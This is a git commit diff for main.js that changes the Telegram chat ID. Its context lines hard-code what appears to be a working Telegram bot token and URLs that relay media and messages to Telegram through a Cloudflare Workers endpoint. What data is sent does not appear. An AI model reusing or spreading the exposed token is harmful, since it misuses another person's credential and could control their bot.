9158216e427337cff3a8fd829c0cfd32f9b8466f
Nhật Minh <jayky2k9@gmail.com>
2025-06-25 10:49:30 +0700

    Update main.js

--- main.js
+++ main.js
@@ -1,5 +1,5 @@
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
-const TELEGRAM_CHAT_ID = '6956722046';
+const TELEGRAM_CHAT_ID = '-1002718473645';
 const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
